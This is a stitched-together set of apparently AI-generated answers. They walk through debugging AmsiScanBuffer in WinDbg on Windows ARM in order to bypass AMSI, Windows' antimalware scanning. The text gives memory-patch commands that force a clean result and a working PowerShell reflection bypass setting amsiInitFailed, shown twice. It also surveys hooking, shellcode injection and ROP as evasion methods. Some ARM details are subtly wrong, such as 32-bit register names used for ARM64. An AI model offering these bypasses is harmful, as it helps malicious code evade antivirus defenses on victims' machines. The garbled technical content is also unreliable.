Running WinDbg on ARM architecture can be a bit different from x86/x64, but the process is similar in many ways. Here's a step-by-step tutorial for setting up and running WinDbg on an ARM Windows system, along with key commands to help you find and test AMSI bypasses.

### **Setting Up WinDbg for ARM**

1. **Install WinDbg Preview**:
   - Download **WinDbg Preview** from the Microsoft Store. It supports ARM architecture and provides a modern interface for debugging.
   - If you’re working on an ARM-based Windows device (such as a Surface Pro X or similar), install the ARM64 version of WinDbg.

2. **Configure WinDbg for ARM**:
   - WinDbg Preview supports debugging ARM binaries. However, you may need to configure it to work efficiently for ARM. Make sure you have the correct **ARM symbol files** for debugging (usually from Microsoft’s public symbol server).
   
   Use the following command in WinDbg to point to the symbol server:
   ```
   .sympath srv*c:\symbols*https://msdl.microsoft.com/download/symbols
   ```
   This ensures you have access to the necessary symbols for debugging.

### **Attaching to a Process or Loading an Executable**

3. **Attach to a Running Process**:
   To debug AMSI-related processes, you may want to attach to PowerShell (`powershell.exe`) or Windows Defender (`MsMpEng.exe`) depending on what you are testing.

   ```
   File -> Attach to a Process
   ```
   Select the process from the list. Once attached, you can start inspecting memory, setting breakpoints, and checking for AMSI-related functions.

4. **Debugging an Executable Directly**:
   If you're running a custom binary for AMSI bypass, load it directly using:
   ```
   File -> Open Executable
   ```
   This will allow you to set breakpoints early and track execution.

### **Key Debugging Commands for AMSI Bypass on ARM**

Once you're set up in WinDbg, you can start exploring AMSI’s behavior. Here are the essential commands to help you find a potential AMSI bypass on ARM architecture:

#### **1. Setting Breakpoints**
   To set breakpoints on specific AMSI functions, such as `AmsiScanBuffer`, use the following commands:

   ```
   bp amsi!AmsiScanBuffer
   ```
   or
   ```
   bp *[ADDRESS]
   ```
   where `[ADDRESS]` is the virtual address of `AmsiScanBuffer`. This will stop execution when the function is hit.

#### **2. Inspecting Registers (ARM-Specific)**
   On ARM, the key registers are different from x86/x64. Use the `r` command to inspect the state of the registers:

   ```
   r
   ```
   Look at `R0` to `R15`, with `R0-R3` being used for function parameters. This will help you understand how data is being passed to AMSI-related functions.

#### **3. Dumping Memory**
   To see the contents of memory and locate AMSI-related structures, use the `dd` or `db` commands. For example:

   ```
   dd [ADDRESS]
   ```
   where `[ADDRESS]` is the memory address of interest. This helps to inspect where AMSI is loading or processing data.

#### **4. Tracing Function Calls**
   If you want to see how a function like `AmsiScanBuffer` is invoked, use the `wt` command (walk the stack):

   ```
   wt
   ```
   This will show the stack trace and give you an idea of which functions are calling AMSI.

#### **5. Stepping Through Code**
   Use `t` or `p` to step through code at the instruction level:

   - `t`: Step into the function (single step).
   - `p`: Step over a function call.
   
   This helps you observe how AMSI behaves when specific buffer scanning happens.

#### **6. Viewing Disassembly**
   To disassemble the code and look for AMSI-related instructions (especially useful when finding NOPs or patch points on ARM):

   ```
   u [ADDRESS]
   ```
   where `[ADDRESS]` is the starting memory address of the AMSI function (e.g., `AmsiScanBuffer`). Look for function prologues and patterns you can patch.

#### **7. Patching Instructions**
   On ARM, the method of patching differs from x86/x64. To patch `AmsiScanBuffer`, you may need to replace the instructions at the start of the function with a benign instruction, such as a `NOP` or jump.

   First, break on the function using `bp`, then use `eb` (edit byte) to patch instructions.

   Example:
   ```
   eb [ADDRESS] [NEW VALUE]
   ```
   where `[ADDRESS]` is the memory address of the function and `[NEW VALUE]` is the new instruction (in byte format) to patch it.

#### **8. Viewing AMSI DLLs**
   You can check which DLLs are loaded, including `amsi.dll`:

   ```
   lm
   ```
   This will list all loaded modules, so you can find the base address of `amsi.dll` to further explore its functions.

### **Steps to Find a Bypass**

1. **Set Breakpoints**: Set breakpoints on key AMSI functions like `AmsiScanBuffer`. This helps you understand how AMSI is invoked on the ARM system.

2. **Step Through Code**: Use stepping commands (`t` or `p`) to see how buffers are processed by AMSI. Monitor registers (`R0-R3`) and stack behavior.

3. **Analyze Function Prologues**: Use the disassembly (`u`) command to look for key entry points. On ARM, typical AMSI bypasses involve replacing function prologues with NOP or jumping over the scanning code.

4. **Memory Inspection**: Dump memory with `dd` to see what AMSI is inspecting. Check whether the buffer being passed to AMSI contains suspicious code or content.

5. **Patching**: After analyzing the function and its behavior, use `eb` or `ed` to patch critical instructions. This could involve NOP’ing out parts of `AmsiScanBuffer`.

6. **Test for Bypass**: After making your patches, resume execution (`g`), and test whether AMSI is still triggering. If AMSI is bypassed, you should see that the malicious code executes without being blocked.

### **Additional Tips**

- **Look for AMSI Hooks**: AMSI often hooks into PowerShell or other processes. Trace how hooks are applied and patch the hook function if necessary.
- **Check for Logs**: Always monitor logs to see whether AMSI is flagging the bypass attempts.

By following these steps, you can effectively debug AMSI on ARM and potentially find bypass techniques unique to ARM’s architecture.

## AmsiScanBuffer

Disassembling and analyzing `AmsiScanBuffer` on Windows 11 ARM involves several steps. This function, part of the Anti-Malware Scan Interface (AMSI), is a common target for malware authors looking to bypass antivirus detection. Below is a general outline of how you can disassemble and analyze this function on an ARM-based Windows 11 machine.

### Steps to Disassemble `AmsiScanBuffer`:

#### 1. **Set Up the Environment**
   - **Virtual Machine:** If possible, use a virtual machine running Windows 11 ARM to avoid any risk to your primary system.
   - **Debugger:** Install a debugger that supports ARM architecture, such as WinDbg or Ghidra. WinDbg is available as part of the Windows SDK.
   - **Symbols:** Ensure you have access to the necessary symbol files for Windows components. You can configure WinDbg to download symbols from the Microsoft symbol server.

#### 2. **Locate `AmsiScanBuffer`**
   - `AmsiScanBuffer` is typically located in `amsi.dll`, which can be found in the `C:\Windows\System32\` directory.
   - Use a tool like **Ghidra** or **IDA Pro** to open `amsi.dll` and locate the `AmsiScanBuffer` function. Alternatively, use WinDbg to load `amsi.dll` into memory and set a breakpoint on `AmsiScanBuffer` to locate it.

#### 3. **Disassemble the Function**
   - In **WinDbg**, after loading `amsi.dll`, you can use the following commands:
     ```plaintext
     .reload /f amsi.dll
     x amsi!*AmsiScanBuffer
     ```
     This will give you the address of `AmsiScanBuffer`. To disassemble, use:
     ```plaintext
     u <address>
     ```
     or in **Ghidra** or **IDA Pro**, you can navigate to the address directly.

#### 4. **Analyze the ARM Assembly**
   - ARM assembly differs from x86/x64, so ensure you're familiar with ARM instructions.
   - Common ARM instructions include:
     - **LDR:** Load register.
     - **STR:** Store register.
     - **BL:** Branch with link (calls another function).
     - **CMP:** Compare registers.
     - **B:** Branch (jump to another location in code).

   - **What to Look For:**
     - **Comparison and Branching:** Check for instructions that compare the buffer contents to known signatures or patterns.
     - **Calls to Other Functions:** Look for calls to functions that might perform actual scanning or logging.
     - **Loops or Conditional Jumps:** These may indicate where the scan logic is implemented.
     - **Anti-Debugging or Anti-VM Checks:** Some versions of AMSI may include checks to detect if they are being debugged or run in a VM.

#### 5. **Identify Bypass Opportunities**
   - Once you identify the scan logic, look for ways it can be bypassed. For example, some bypass techniques involve modifying the return value of `AmsiScanBuffer` or changing conditional jumps so that they always return a "clean" result.
   - On ARM, the specific instructions for modifying register values or altering program flow will differ from x86/x64, but the concept remains the same.

#### 6. **Patch or Modify Code (for Testing)**
   - If you're testing bypass techniques, you might want to patch `amsi.dll` in memory or on disk. This can be done using a hex editor or directly in a debugger.
   - Always ensure you have a backup of the original `amsi.dll` and that you're working in a safe, isolated environment.

### Example ARM Instructions to Look For:

- **CMP** instructions might compare buffer contents or scan results.
- **BL** followed by a function address might indicate a call to the core scanning logic.
- **MOV**, **STR**, **LDR** instructions could manipulate the return value.

### Tools:

- **WinDbg:** For real-time debugging.
- **Ghidra:** Free and open-source, supports ARM disassembly.
- **IDA Pro:** Popular disassembler with ARM support (paid software).

### ARM Assembly Resources:

- **ARM Reference Manual:** Familiarize yourself with ARM instruction sets.
- **Online ARM Assembly Tutorials:** These can help bridge the gap if you're more familiar with x86/x64.

Overwriting memory locations in a DLL on Windows using ARM architecture requires an understanding of ARM assembly instructions and how they correspond to the behavior of functions within the DLL. Here’s a breakdown of both obvious and less obvious instructions and techniques you might consider when aiming to manipulate the function's return value:

### 1. **Obvious Instructions to Look For:**

   - **`MOV` (Move) Instruction:**
     - **Purpose:** Transfers data from one register to another.
     - **Example:** `MOV R0, #0` sets the register `R0` (often used for return values) to `0`. By modifying this, you can change the function's return value.
     - **Usage:** Modify the value moved into `R0` before the function returns to alter its outcome.

   - **`LDR` (Load Register) Instruction:**
     - **Purpose:** Loads data from memory into a register.
     - **Example:** `LDR R0, [R1]` loads the value from the address in `R1` into `R0`. Changing the memory address or value loaded can affect the function's logic or return value.
     - **Usage:** Alter the memory address or the value at that address to control what gets loaded into the register.

   - **`STR` (Store Register) Instruction:**
     - **Purpose:** Stores data from a register into memory.
     - **Example:** `STR R0, [R1]` stores the value in `R0` into the memory location pointed to by `R1`.
     - **Usage:** Modify the store operation to overwrite data that the function will later use to determine its return value.

   - **`BX LR` (Branch to Link Register):**
     - **Purpose:** This instruction typically ends a function by branching to the address stored in the link register (`LR`).
     - **Usage:** If the return value is stored in `R0`, changing its value just before `BX LR` executes can directly influence the function's return.

### 2. **Less Obvious Instructions/Techniques:**

   - **`CMP` (Compare) and `Conditional Branches (e.g., BEQ, BNE)`:**
     - **Purpose:** These instructions compare two values and then branch depending on the result (e.g., equal, not equal).
     - **Example:** `CMP R0, #1; BEQ some_label` compares `R0` to `1` and branches if they are equal.
     - **Usage:** Modify the comparison value or change the branch condition to alter the control flow, making the function take a different path or return an alternative value.

   - **`SUBS` (Subtract with Status Update) or `ADDS` (Add with Status Update):**
     - **Purpose:** These instructions perform arithmetic while also updating the flags (e.g., zero flag, negative flag).
     - **Example:** `SUBS R0, R0, #1` subtracts `1` from `R0` and updates the flags. The function’s logic might depend on these flags.
     - **Usage:** Change the arithmetic operation to influence flags and branch conditions, indirectly changing the function’s return.

   - **`BL` (Branch with Link):**
     - **Purpose:** Calls a subroutine and saves the return address in the link register (`LR`).
     - **Usage:** Redirect the function call to a different routine or hook the call to alter the return value before the function exits.

   - **`NOP` (No Operation):**
     - **Purpose:** Does nothing, used to fill gaps or for timing.
     - **Usage:** Replace critical instructions with `NOP` to disable certain checks or manipulations within the function, indirectly affecting the return value.

   - **`VSTR`/`VLDR` (Store/Load Floating-Point Register):**
     - **Purpose:** ARM supports floating-point operations, and these instructions store/load floating-point registers.
     - **Usage:** If the function operates on floating-point data, altering these instructions can modify the function’s floating-point return value.

   - **Inline Patching with Shellcode:**
     - **Technique:** Insert custom shellcode directly into the function, which overrides the normal execution path.
     - **Usage:** Overwrite the start of the function with a jump to your shellcode, which can perform any necessary operations and return a manipulated value.

### 3. **Hooking Techniques:**

   - **Function Hooking:**
     - **Method:** Redirect the function to your custom code by overwriting its entry point with a branch (`B`) or branch-and-link (`BL`) instruction to a hook function.
     - **Usage:** The hook function can then manipulate registers and return a different value.

   - **Import Address Table (IAT) Hooking:**
     - **Method:** Modify the IAT to point to a different function, which can then manipulate the data and return an altered value.
     - **Usage:** This is particularly useful if the function is an external API call.

### 4. **Using the ARM Stack Frame:**

   - **Stack Manipulation:**
     - **Method:** Modify stack-related instructions like `PUSH`, `POP`, `STMFD`, or `LDMFD` to change the data the function returns.
     - **Usage:** Alter the return address or data stored on the stack to control what the function returns.

### 5. **Advanced Techniques:**

   - **Return-Oriented Programming (ROP):**
     - **Method:** Manipulate the stack to control the flow of execution by chaining together small code sequences (gadgets) that end in a return instruction.
     - **Usage:** Use ROP to execute a series of instructions that set up a specific return value without needing to modify the function directly.

### **Key Points:**
- **Understanding the Function's Purpose:** Analyze what the function is supposed to return and where that value is set. Focus on registers like `R0` (or `R0-R3` for returning multiple values) as these are typically used for return values in ARM.
- **Non-Invasive Techniques:** If possible, use non-invasive methods like hooking or IAT modification to intercept and change return values without altering the DLL directly.
- **Testing:** Carefully test any changes in a controlled environment, as overwriting DLL memory can easily crash the program if done incorrectly.

By understanding and utilizing these ARM-specific instructions and techniques, you can effectively manipulate a DLL’s behavior to achieve your desired outcomes.

Bypassing AMSI (Antimalware Scan Interface) on Windows 11 ARM requires an understanding of how AMSI operates and where its defenses can be circumvented. AMSI is a security feature designed to help detect and block malicious code execution, particularly in scripts and dynamic content. `AmsiScanBuffer` is a key function in this interface that scans buffers of data for potential threats.

Here are some things you can look for when attempting to bypass `AmsiScanBuffer` on Windows 11 ARM:

### 1. **Memory Patching**
   - **Purpose:** Modify the AMSI-related code in memory to disable or weaken its scanning capabilities.
   - **Key Areas to Patch:**
     - **`AmsiScanBuffer` Function Return Value:** By patching the return value of `AmsiScanBuffer`, you can make it always return a benign result, effectively bypassing the AMSI check.
     - **Example:** Modify the `AmsiScanBuffer` function in memory so that it always returns `AMSI_RESULT_CLEAN` (which is typically `0`).
     - **ARM-Specific Instructions:** Look for instructions like `MOV R0, #0` (setting the return value) or branch instructions like `BX LR` that conclude the function, and patch them accordingly.

### 2. **Hooking**
   - **Purpose:** Redirect the AMSI function to your own code, which can manipulate or bypass the intended behavior.
   - **Hooking `AmsiScanBuffer`:**
     - **Method:** Use techniques such as Inline Hooking or Import Address Table (IAT) Hooking to intercept calls to `AmsiScanBuffer`.
     - **Custom Function:** Your hook function can bypass the scan by either returning a clean result or skipping the actual scanning logic.
   - **ARM-Specific Hooking:** Pay attention to the prologue and epilogue of functions, and ensure your hook preserves the original context on ARM.

### 3. **Reflection/Assembly Manipulation**
   - **Purpose:** Modify the runtime behavior of a process to disable AMSI without direct memory tampering.
   - **Reflection Techniques:**
     - **DotNet-Based Applications:** Use reflection in .NET applications to modify or remove AMSI integrations at runtime.
     - **Dynamic Reconfiguration:** Modify the function pointers or other runtime data structures to bypass AMSI checks.
   - **ARM Considerations:** Adjust your code to correctly handle the ARM architecture’s calling conventions and register usage.

### 4. **Shellcode Injection**
   - **Purpose:** Inject shellcode that disables AMSI or prevents it from interfering with your payload.
   - **Shellcode Example:**
     - Inject a small shellcode snippet that patches or hooks `AmsiScanBuffer` in a process that is known to use AMSI (e.g., `powershell.exe`).
   - **ARM Shellcode:** Ensure your shellcode is written in ARM assembly or is compatible with ARM instructions.

### 5. **PowerShell-Based Bypass**
   - **Purpose:** Use PowerShell scripts or commands to disable or evade AMSI.
   - **Bypassing in PowerShell:**
     - **Patch AMSI in Memory:** A common technique involves locating the `AmsiScanBuffer` method within PowerShell's process memory and patching it.
     - **Disable AMSI Initialization:** Modify the PowerShell engine initialization process to skip or disable AMSI setup.
   - **ARM PowerShell:** Adapt these techniques to work on the ARM version of PowerShell, focusing on the correct memory addresses and ARM instructions.

### 6. **Environment Variable Manipulation**
   - **Purpose:** Some versions of AMSI are influenced by environment variables that can change their behavior.
   - **Example:** Setting or modifying certain environment variables might bypass or weaken AMSI's functionality in specific contexts.
   - **ARM-Specific:** Ensure that any environment-based bypass works on the ARM architecture and with the ARM-specific Windows environment.

### 7. **Exploit Weaknesses in AMSI Integration**
   - **Purpose:** Exploit known vulnerabilities or weaknesses in how AMSI integrates with specific applications.
   - **Focus Areas:**
     - **Malware-Specific Bypass Techniques:** Some malware uses known bypass techniques that exploit weaknesses in AMSI integrations or their configurations.
     - **Application-Specific:** Certain applications might implement AMSI incorrectly or have weaknesses that can be exploited.
   - **ARM Context:** Ensure the vulnerabilities or weaknesses are present in the ARM version of the application or service you're targeting.

### 8. **Understanding AMSI's Workflow on ARM**
   - **Purpose:** Deeply understand how AMSI operates on ARM to find architectural weaknesses.
   - **Focus on:**
     - **Buffer Submission:** Identify where and how the buffers are submitted to AMSI and how you can intercept or modify this process.
     - **Return Values and Error Handling:** Exploit weaknesses in how return values and errors are handled within the AMSI pipeline on ARM.
   - **ARM Assembly Analysis:** Analyze the AMSI functions in ARM assembly to identify where you can introduce your bypass.

### **Precautions and Ethical Considerations:**
- **Legal Use Only:** Techniques to bypass security features like AMSI should only be used in legal contexts, such as penetration testing, research, or with explicit permission from the system owner.
- **Testing:** Always test your techniques in a controlled environment to avoid unintended consequences, such as system instability or detection by other security mechanisms.
- **Detection:** Be aware that bypass techniques might be detected by other security tools or monitored by security analysts.

By focusing on these areas and techniques, you can explore potential ways to bypass `AmsiScanBuffer` on Windows 11 ARM. Keep in mind that the security landscape is constantly evolving, and new protections or detection methods might mitigate some of these techniques over time.

Certainly! Disassembling and analyzing functions using WinDbg is a critical skill for reverse engineering and debugging on Windows, especially when working with ARM architecture. Below are the steps and instructions to get you started with using WinDbg for disassembling and analyzing functions like `AmsiScanBuffer`.

### **1. Setting Up WinDbg for ARM Debugging**

First, ensure you have the correct version of WinDbg installed that supports ARM architecture:
- **Download the ARM-compatible version of WinDbg** from the Windows Software Development Kit (SDK).
- **Install the ARM symbols** by configuring the symbol path correctly.

### **2. Configuring Symbol Paths**
To make sense of the disassembly, you need to load the correct symbols:

```bash
.sympath srv*c:\symbols*https://msdl.microsoft.com/download/symbols
.reload
```

- This command sets the symbol path and loads symbols from Microsoft’s symbol server. Adjust the local path (`c:\symbols`) as needed.

### **3. Loading the Target Process**

Next, you need to attach WinDbg to the process you want to analyze. For example, if you want to examine `AmsiScanBuffer` within `powershell.exe`:

```bash
windbg -p <ProcessID>
```

Alternatively, you can start the process directly from WinDbg:

```bash
windbg -g -o "C:\path\to\powershell.exe"
```

### **4. Finding and Setting Breakpoints**

Identify the function you want to disassemble, such as `AmsiScanBuffer`, and set a breakpoint:

```bash
bp AmsiScanBuffer
g
```

- **`bp`**: Sets a breakpoint at the beginning of `AmsiScanBuffer`.
- **`g`**: Runs the program until it hits the breakpoint.

### **5. Disassembling the Function**

Once the breakpoint is hit, you can disassemble the function:

```bash
u AmsiScanBuffer
```

- **`u` (Unassemble):** This command disassembles the function starting at `AmsiScanBuffer`.

To view a specific range of instructions, specify an address range:

```bash
u <start address> <end address>
```

### **6. Analyzing the Disassembled Code**

When examining the disassembled ARM instructions, look for:

- **Function Prologue and Epilogue:** Identify where the function starts (`STMFD`/`PUSH`) and ends (`LDMFD`/`POP`, `BX LR`).
- **Critical Instructions:**
  - **`MOV`, `LDR`, `STR`:** Key instructions for moving, loading, and storing data.
  - **`CMP`, `BNE`, `BEQ`:** Instructions used for comparisons and conditional branching.
  - **Function Call (`BL`):** Look for branches to other functions and subroutines.

### **7. Modifying Execution Flow**

If your goal is to bypass or alter the function’s behavior, you can modify registers or memory at runtime:

- **Setting Registers Manually:**
  - Use the `r` command to examine or modify registers. For example:
  
    ```bash
    r R0=0  # Set the return value to 0 (AMSI_RESULT_CLEAN)
    ```

- **Patching Instructions:**
  - Use the `e` (enter) command to modify memory directly:

    ```bash
    eb <address> <new_value>
    ```

  - Example: Change a `MOV R0, #1` instruction to `MOV R0, #0` to alter a return value.

### **8. Stepping Through Code**

You can step through instructions to observe how the function operates:

- **Step Over (`p`):** Steps over a function call.
- **Step Into (`t`):** Steps into a function call, useful for analyzing nested functions.
- **Step Out (`pt`):** Executes the remaining instructions in the current function and stops after returning.

### **9. Inspecting Memory and Data Structures**

Use the `dd` command to inspect memory locations:

```bash
dd <address>
```

- This can be useful for checking data that `AmsiScanBuffer` might be scanning or modifying.

### **10. Dumping and Saving Disassembled Code**

To save the disassembled output to a file:

```bash
.logopen C:\path\to\log.txt
u AmsiScanBuffer
.logclose
```

### **11. Additional Considerations for ARM**

- **ARM Calling Conventions:** Registers R0-R3 are used for passing arguments and returning values. Be mindful of these when analyzing the function's entry and exit points.
- **Endianness:** ARM architecture can operate in both little-endian and big-endian modes. Ensure you’re interpreting the disassembly correctly based on the system’s configuration.

### **12. Debugging and Repeating**

Continue debugging, modifying, and analyzing the code until you achieve your objective. You can restart the debugging session if necessary to test different approaches.



Bypassing AMSI (Antimalware Scan Interface) on Windows, including the ARM architecture, is a tactic often employed by attackers to avoid detection by Windows Defender and other security tools that rely on AMSI to scan potentially harmful code, especially scripts like PowerShell or VBScript. While most AMSI bypass techniques have been developed for x86 and x64 architectures, many of these techniques can be adapted for ARM-based systems, though there may be unique challenges due to differences in how Windows runs on ARM.

### Methods of Bypassing AMSI (for ARM and x86/x64)

1. **AMSI Patch in Memory**:
   Attackers can use memory patching techniques to disable AMSI’s functionality at runtime. This typically involves finding the memory location where AMSI functions (such as `AmsiScanBuffer`) are loaded and patching the first few bytes to effectively "NOP" (no operation) out the function, rendering it useless.

   On Windows ARM, this can be done similarly, although ARM instructions and calling conventions differ from x86/x64. Attackers need to identify the memory address of `AmsiScanBuffer` in the ARM version of the Windows DLL and patch it.

   Example (x64, adapted for ARM):
   ```powershell
   $Assembly = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
   $AMSIField = $Assembly.GetField("amsiInitFailed","NonPublic,Static")
   $AMSIField.SetValue($null,$true)
   ```

   This effectively disables AMSI checks in PowerShell.

2. **AMSI Context Alteration**:
   Attackers can also modify the context in which AMSI scans code. By altering the buffer passed to `AmsiScanBuffer`, attackers can either feed benign content to AMSI while executing malicious code, or modify the scanning parameters (like length of the buffer).

   This is architecture-independent and can work on both x64 and ARM if the attacker can intercept and modify the arguments passed to AMSI’s functions.

3. **Assembly-Based Bypass (using Reflection)**:
   On both ARM and x86/x64, bypasses can be implemented using .NET reflection to modify AMSI-related fields, such as the `amsiInitFailed` flag, which indicates if AMSI is enabled or not. If this flag is set to `true`, AMSI is effectively disabled for that session.

   Example:
   ```powershell
   $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $b=$a.GetField('amsiInitFailed','NonPublic,Static')
   $b.SetValue($null,$true)
   ```

4. **Malicious Use of Unsigned Binaries**:
   Attackers can also employ binaries or scripts that aren’t subject to AMSI scanning or are trusted by the system. For instance, some built-in or third-party utilities may not trigger AMSI scanning, allowing attackers to execute code undetected.

5. **In-Process Code Injection**:
   Code injection into a process that bypasses AMSI (such as processes that do not load AMSI or do not implement it correctly) can work across all architectures. Attackers inject malicious code into a trusted process (such as `explorer.exe`) that doesn’t trigger AMSI scans, and then execute the code from within that process.

6. **Unhooking AMSI DLL Functions**:
   Unhooking involves removing or bypassing the hooks placed by AMSI in critical system DLLs. Tools like `SharpUnhooker` can be adapted for ARM, assuming the necessary function addresses are identified and handled correctly. This requires knowledge of ARM assembly for unhooking AMSI functions effectively.

### AMSI-Specific Challenges on ARM:

1. **Instruction Set Differences**:
   ARM architecture has a different instruction set compared to x86/x64. Techniques that involve patching specific machine instructions need to account for this difference. For example, NOP instructions, branch instructions, or memory address manipulations differ on ARM.

2. **Tool Compatibility**:
   Many common tools for bypassing AMSI, like PowerSploit or Mimikatz, may not be directly compatible with ARM. They would either need recompiling for ARM or alternative ARM-specific versions would need to be developed.

3. **Fewer Bypassing Tools for ARM**:
   While there are many well-known AMSI bypass techniques for x86/x64 systems, fewer public tools or scripts target ARM. This makes bypassing AMSI on ARM slightly more challenging, though not impossible for skilled attackers.

### Detection and Mitigation:

To mitigate AMSI bypass techniques, Microsoft frequently updates Windows Defender and AMSI itself to detect common patching and bypassing methods. Additionally, system administrators can implement:

1. **AppLocker/Device Guard**: Limit the ability to run unsigned or untrusted binaries/scripts.
2. **ScriptBlock Logging**: Enable PowerShell ScriptBlock logging to capture and analyze scripts being executed on the system.
3. **Credential Guard**: Enable Windows Defender Credential Guard to protect against credential-related attacks.
4. **Behavioral Monitoring**: Use security tools that focus on behavior-based detection, which can spot unusual memory or API manipulations.


Running AMSI on ARM for security research can be challenging due to the architectural differences between x86/x64 and ARM. Here are several key considerations and strategies to help you debug and potentially break AMSI on ARM:

### 1. **Instruction Set Differences:**
   ARM uses a Reduced Instruction Set Computing (RISC) architecture, which has different machine instructions compared to x86/x64. The operations and patterns used to disable or patch AMSI on x86/x64, such as patching function prologues with `NOP` instructions, need to be replaced with ARM-specific instructions.

   - On ARM, patching typically involves replacing instructions with "no operation" equivalents like `NOP` (or adjusting branch instructions), but the encoding is different.
   - Analyze how function calls (e.g., `AmsiScanBuffer`) are invoked, and look for the entry points of those functions.
   
   On ARM, AMSI-related functions may be located in different memory regions, and finding the right addresses will require disassembling the binary or using debugging tools that can work with ARM architecture.

### 2. **Debugging AMSI on ARM:**
   Since standard debuggers and reverse engineering tools for x86/x64 (like IDA Pro or x64dbg) may not fully support ARM Windows environments, try the following tools:

   - **WinDbg Preview (with ARM support):** This supports ARM architecture and is capable of attaching to processes and debugging functions such as `AmsiScanBuffer`.
   - **Ghidra (with ARM processor module):** This can be used to reverse-engineer AMSI on ARM, including decompiling and analyzing the flow of functions.

   You will need to set breakpoints on AMSI-related functions like `AmsiScanBuffer` or `AmsiOpenSession` to observe how they behave on ARM.

### 3. **Identify AMSI Hook Locations:**
   AMSI functions are usually located in `amsi.dll`, and on ARM, you will need to trace where `AmsiScanBuffer` is invoked, as well as other functions like `AmsiInitialize` and `AmsiUninitialize`. The function addresses may be different from x86/x64, so you'll need to:

   - **Dump the loaded DLLs** and analyze `amsi.dll` on ARM.
   - **Find the virtual address** of `AmsiScanBuffer` or other critical functions using debugging tools.
   - Set breakpoints on these functions and observe how they handle the scanning process.

### 4. **Study ARM Calling Conventions:**
   On ARM, the calling convention differs from x86/x64, so tracing how parameters are passed to functions like `AmsiScanBuffer` may require analyzing the `R0-R3` registers, which are used to pass arguments in ARM's procedure calling standard. Ensure you’re monitoring the right registers when breaking on function entry points.

   - Check how the stack frame is set up and how return values are passed back in `R0`.

### 5. **Memory Patching and AMSI Bypass on ARM:**
   Instead of using standard `NOP` instructions, you may need to replace ARM instructions with `NOP` equivalents or adjust branches that point to `AmsiScanBuffer`. Ensure that the architecture’s instruction set is considered, as the binary layout and how memory is accessed may differ.

   - Find the offset in memory where AMSI functions are loaded and try to replace those with neutral values (like `MOV R0, R0` or other benign instructions in ARM).

### 6. **Emulating or Testing AMSI on ARM:**
   If direct access to ARM-based Windows devices is limited, consider using an **ARM-based Windows emulator** for testing. This allows you to test AMSI behavior and apply debugging tools without needing physical hardware.

### 7. **Inspecting AMSI Signature Verification:**
   On ARM, AMSI’s signature verification might behave differently, especially if certain APIs aren't fully ported or implemented the same way. Compare the behavior of AMSI between x86/x64 and ARM when handling specific code or scripts to spot any differences.

   - Look for inconsistencies in how `AmsiScanBuffer` processes buffers, especially when dealing with PowerShell scripts or executable code on ARM systems.

### 8. **Hook Detection or Avoidance:**
   AMSI hooks its functions into system processes. Analyzing how these hooks are applied on ARM and attempting to bypass them could reveal specific vulnerabilities. Check for any differences in hook installation between ARM and x86/x64.

### 9. **AMSI Logs and Error Reporting:**
   When working with AMSI, check for logs that Windows may produce (event logs, Defender logs) on ARM systems. If you encounter issues like incomplete scans or missing hooks, these logs may help pinpoint how AMSI is implemented differently on ARM.

### Key Focus Areas for Debugging AMSI on ARM:
   - **VirtualAlloc-based memory manipulation**: How memory is allocated and protected on ARM.
   - **ARM instruction set patching**: Understanding ARM assembly for patching functions.
   - **ARM register analysis**: Looking at how registers are used during AMSI function calls.
   - **Hooking detection and bypass**: How AMSI hooks on ARM may differ from x86/x64.

By focusing on these areas, you should be able to identify key differences between AMSI's behavior on ARM and x86/x64, allowing you to develop methods for bypassing or breaking AMSI on ARM-based systems.


## Debugging

This snippet is a disassembly of ARM64 (AArch64) machine instructions. Let's break down each line to explain what the instructions are doing.

1. **`00007ff8`bad44e30 d503237f pacibsp`**:
   - `pacibsp`: This is the "Pointer Authentication Code (PAC)" instruction that generates a cryptographic signature (PAC) for the stack pointer (`sp`) and stores it in the link register (`lr`). This is part of ARMv8.3-A's pointer authentication mechanism, used to help protect against Return-Oriented Programming (ROP) attacks by signing and later authenticating function return addresses.

2. **`00007ff8`bad44e34 a9bd53f3 stp x19,x20,[sp,#-0x30]!`**:
   - `stp x19,x20,[sp,#-0x30]!`: This stores the pair of registers `x19` and `x20` to the stack at the current stack pointer location (sp), but with an offset of `-0x30` (48 bytes). The `!` after the addressing mode means the stack pointer is updated with the new value after the store.

3. **`00007ff8`bad44e38 a9015bf5 stp x21,x22,[sp,#0x10]`**:
   - `stp x21,x22,[sp,#0x10]`: This stores the pair of registers `x21` and `x22` at the stack location with an offset of `0x10` (16 bytes) from the current stack pointer. The stack pointer (`sp`) is not modified here.

4. **`00007ff8`bad44e3c a9026bf9 stp x25,x26,[sp,#0x20]`**:
   - `stp x25,x26,[sp,#0x20]`: This stores the pair of registers `x25` and `x26` at the stack location with an offset of `0x20` (32 bytes) from the current stack pointer.

5. **`00007ff8`bad44e40 a9bc7bfd stp fp,lr,[sp,#-0x40]!`**:
   - `stp fp,lr,[sp,#-0x40]!`: This stores the frame pointer (`fp`) and link register (`lr`) on the stack with an offset of `-0x40` (64 bytes), and updates the stack pointer accordingly. This is typical of a function prologue, where the old frame pointer and return address (in `lr`) are saved.

6. **`00007ff8`bad44e44 910003fd mov fp,sp`**:
   - `mov fp,sp`: This moves the current stack pointer (`sp`) into the frame pointer (`fp`). This establishes a new stack frame for the function.

7. **`00007ff8`bad44e48 aa0003f3 mov x19,x0`**:
   - `mov x19,x0`: This moves the value in register `x0` (which typically holds the first argument to a function in ARM64 calling conventions) to register `x19`, likely for safekeeping during the function's execution.

8. **`00007ff8`bad44e4c aa0103f4 mov x20,x1`**:
   - `mov x20,x1`: This moves the value in register `x1` (which typically holds the second argument to a function) to register `x20`, again for use within the function.

### General Context:
- This appears to be part of a function prologue on an ARM64 system. The prologue saves the values of several registers (`x19`, `x20`, `x21`, `x22`, `x25`, `x26`, `fp`, and `lr`) to the stack so they can be restored later, likely during the function's epilogue.
- The use of PAC (`pacibsp`) suggests that this code is employing ARM's pointer authentication to protect the integrity of return addresses, which is common in secure environments to defend against control-flow hijacking attacks like ROP.

This is typically part of a compiled function where the local variables and return address are being set up at the beginning of the function's execution.

This is a register dump from an ARM64 (AArch64) system, typically seen in debugging or crash analysis. Each register in the output contains a hexadecimal value representing its current state at the time of the snapshot.

Here's a breakdown of key parts of this dump:

1. **General Purpose Registers (`x0` to `x28`)**:
   - These are the general-purpose registers used in function calls and to store intermediate values. For example:
     - `x0=0000021a0417f440` might represent the first argument passed to a function.
     - `x1=0000021a04340d54` would be the second argument.
